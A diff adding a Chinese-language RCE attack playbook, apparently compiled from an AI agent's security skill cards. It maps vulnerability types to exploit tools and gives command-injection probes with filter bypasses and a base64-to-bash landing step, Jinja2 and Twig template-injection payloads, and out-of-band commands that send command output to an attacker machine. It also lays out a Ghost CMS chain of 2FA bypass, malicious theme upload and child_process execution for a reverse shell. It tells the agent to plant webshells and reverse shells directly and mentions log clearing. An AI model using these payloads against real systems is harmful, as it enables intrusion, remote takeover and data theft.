@@ -1,0 +1,144 @@
+---
+title: "测绘引擎RCE锻造手法.md"
+generated: 2026-10-21
+kind: consolidated-playbook
+note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
+---
+
+# 测绘引擎RCE锻造手法.md
+
+> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。
+
+## 来源卡
+
+- `/root/.hermes/skills/security/rce-encyclopedia/SKILL.md`
+
+## 汇总内容
+
+### rce-encyclopedia
+
+来源：`/root/.hermes/skills/security/rce-encyclopedia/SKILL.md`
+
+# RCE 十形矩阵（测绘引擎）
+
+目标须在 `config/scope*.json`。本卡是 **分流**，打穿走专卡和 `rce_forge.py`。  
+`shoot` 出 `uid=` 才算 L3。授权内写马/反弹直接做。
+
+| 档 | 成立 | 不算 |
+|----|------|------|
+| primitive | 延时 / DNS / 报错可控 | 只猜组件名 |
+| L2 / local_proof | 靶场或回显标记 `se9359` / 算术 49 | 只 nuclei 版本 |
+| L3 / remote_proof | `uid=` 或文件 **可执行** 或回连 | 上传 200；管理后台登录 |
+
+## 立刻跑
+
+```bash
+python3 tools/ops/rce_family_route.py --signal 命令注入
+python3 tools/ops/rce_family_route.py --list
+python3 tools/ops/rce_family_route.py grade --kind primitive --note 'dnslog only'
+python3 tools/ops/rce_forge.py --list
+python3 tools/ops/rce_forge.py shoot --family cmdi-unix --url 'https://授权/?q=1' --param q --case <案>
+```
+
+## 十形 → 专卡
+
+| 形 | 走 | 锻造族 |
+|----|----|--------|
+| 命令注入 | `command-injection-testing` · `tpl_inject_probe.py cmdi` | `cmdi-unix` |
+| SSTI | `ssti-exploit` · `tpl_inject_probe.py ssti` | `ssti-jinja` / twig / … |
+| 反序列化 | `deserialization-testing` / PHP 反序列化手法 | `deser-pickle` |
+| 上传 | `file-upload-testing` · `upload_forge_probe.py` | 落马后再 `php-eval` |
+| LFI | `lfi-rfi-exploit` · `tpl_inject_probe.py lfi` | `php-wrap` |
+| SQLi→RCE | `sql-injection-testing` · `sqlmap_kit.py ladder` | OUTFILE / xp_cmdshell |
+| SSRF→RCE | `ssrf-testing` · `ssrf_probe.py` | gopher Redis / IMDS |
+| XXE | `xxe-injection-testing` | `xxe-expect` |
+| JNDI | `log4shell-exploitation` | `jndi` |
+| 表达式 | `expression-language-injection` | `el-spel` / ognl |
+
+无回显：时间盲注 → DNS 外带 → HTTP 外带。先 `se_listen.py` 再射回连。
+
+```bash
+python3 tools/ops/oob_exfil.py dns --data id --domain oob.lab
+python3 tools/ops/oob_exfil.py http --data id --url http://攻击机:8080/
+```
+
+## 强制
+
+1. 点名抢 RCE / getshell **先本卡认形**，再专卡，不要空喊百科。
+2. 写文件 / DNSlog / 登录后台 **不许写成已 GetShell**。
+3. 先默认口令和基础设施口，再高端 CVE。
+4. 一次只改一个变量。清日志仍先问。
+
+## 真源
+
+- 手法：`docs/playbooks/测绘引擎RCE锻造手法.md`
+- 路由：`tools/ops/rce_family_route.py`
+- 锻造：`tools/ops/rce_forge.py`
+
+---
+
+<!-- 以下内容合并自兄弟技能库 (2026-09-12) -->
+
+---
+name: rce-encyclopedia
+description: "RCE全打法家族矩阵: 攻击面×漏洞形态×利用链。触发: rce, 抢rce, getshell, 命令执行。"
+---
+
+# RCE 百科全书 — 全打法家族矩阵
+
+全球 RCE 教程整合(2026-08 收集, 47万字节原始材料)。核心理念(用户偏好): **类级拓展 — 攻击面 × 漏洞形态 × 利用链可横向替换**, 拒绝单点打法。
+
+## 何时使用
+
+- 目标是任意 Web 服务/中间件, 需要 RCE/命令执行/getshell
+- 用户说: rce、抢rce、远程代码执行、getshell、拿shell、命令执行
+- 拿到指纹后要快速确定该用哪条 RCE 路线
+- 与 server-getshell-playbook(十大路径/实战纪律)配合: 本 skill 提供**漏洞形态级**完整矩阵, getshell-playbook 提供**流程纪律**
+
+## 核心矩阵: 攻击面 × 漏洞形态 → RCE 路线
+
+```
+输入面                漏洞形态                  RCE 路线
+─────────            ──────────               ─────────────
+用户输入(参数/头)   → 命令注入(OS CMD)      → 直接 system()/shell
+模板渲染            → SSTI                   → Jinja2/Twig/ERB → RCE
+XML/JSON/YAML       → XXE/反序列化           → 读文件/SSRF → RCE
+文件上传            → 任意文件上传           → webshell/覆盖配置 → RCE
+文件包含            → LFI/RFI               → php://filter/log/会话 → RCE
+数据库查询          → SQLi                  → OUTFILE/udf/xp_cmdshell → RCE
+HTTP 请求转发       → SSRF                  → 内网服务(Redis/MySQL) → RCE
+对象反序列化        → 不安全反序列化         → gadget 链(pickle/phpggc/ysoserial)
+模板/DSL 编译       → 表达式注入             → 沙箱逃逸 → RCE
+认证/会话           → 弱口令/越权           → 管理面上传/执行 → RCE
+```
+
+## 十大漏洞形态速查(每条: 探测 → 确认 → 利用)
+
+### 1. 命令注入 (Command Injection)
+```
+探测: 参数后加 ;id / |id / `id` / $(id) / %0aid
+     POST body / header(X-Forwarded-For) / filename 都可能注入
+绕过: 空格→${IFS}/%09  |  黑名单→$()/``/$(printf)  |  编码→base64
+利用链: 回显直接看 → 无回显用 sleep/time 盲注 → DNS/HTTP 外带
+关键: echo <b64>|base64 -d|bash  一条龙落地
+```
+
+### 2. SSTI (Server-Side Template Injection)
+```
+引擎识别: {{7*7}} → 49  |  ${7*7}  |  <%=7*7%>  |  #{7*7}
+Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+           {{''.__class__.__mro__[1].__subclasses__()}} 找 subprocess
+Twig:      {{['id']|filter('system')}} / {{_self.env.registerUndefinedFilterCallback}}
+沙箱逃逸: 绕过 _ 过滤用 attr/request[arg] | 过滤 . 用 ['x']['y']
+参考: hacktricks/ht_ssti-server-side-template-injection_README.md
+```
+### 2b. 恶意主题/模板文件注入(模板引擎代码执行)— Ghost CMS CVE-2026-29053(0.7.2–6.19.0)
+- 形态: CMS 允许上传/激活主题(zip),模板文件(handlebars `.hbs` 等)内嵌代码在渲染时执行 → RCE
+- Ghost 实链(MSF module 2026-09,含 CVE-2026-22594 Staff 2FA bypass 6.0.0–6.10.3 / 5.105.0–5.130.5):
+  1. 弄到 staff 会话: 账号密码登录;版本命中则走 2FA bypass
+  2. 上传"感染"主题 zip: 在 `tag-{{SLUG}}.hbs`/`page-{{SLUG}}.hbs` 模板插 `{{!< default}}` + JS payload: `process.mainModule.require('child_process').exec("<b64 bytes>",{detached:1})`
+  3. `PUT /themes/<name>/activate/` 激活 → GET 对应 tag/page 触发渲染 → 命令执行(可反向 shell)
+- 类级迁移: 任何"上传主题/插件/模板包 + 服务端渲染"的 CMS(WordPress 插件、博客、wiki)同链;模板不限于 handlebars(Node 系 EJS/Pug 同理)
+- 参考: https://www.endorlabs.com/
+
+…（截断，全文见来源卡）
